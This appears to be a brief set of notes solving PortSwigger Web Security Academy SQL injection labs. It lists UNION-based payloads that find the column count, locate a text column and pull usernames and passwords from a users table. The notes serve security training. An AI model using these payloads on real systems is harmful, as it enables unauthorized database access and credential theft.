# SQL injection

## SQL injection UNION attack, determining the number of columns returned by the query

 ```sql
    ' ORDER BY 3--
 ```

 ```sql
    ' UNION SELECT NULL,NULL,NULL--
 ```

 [Challenge](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

 ## Finding columns with a useful data type in an SQL injection UNION attack

 Identify string collumn

```sql
    ' UNION SELECT NULL,NULL,'a',NULL--
```

[Challenge](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

## SQL injection UNION attack, retrieving data from other tables

```sql
    ' UNION SELECT username, password FROM users-- 
```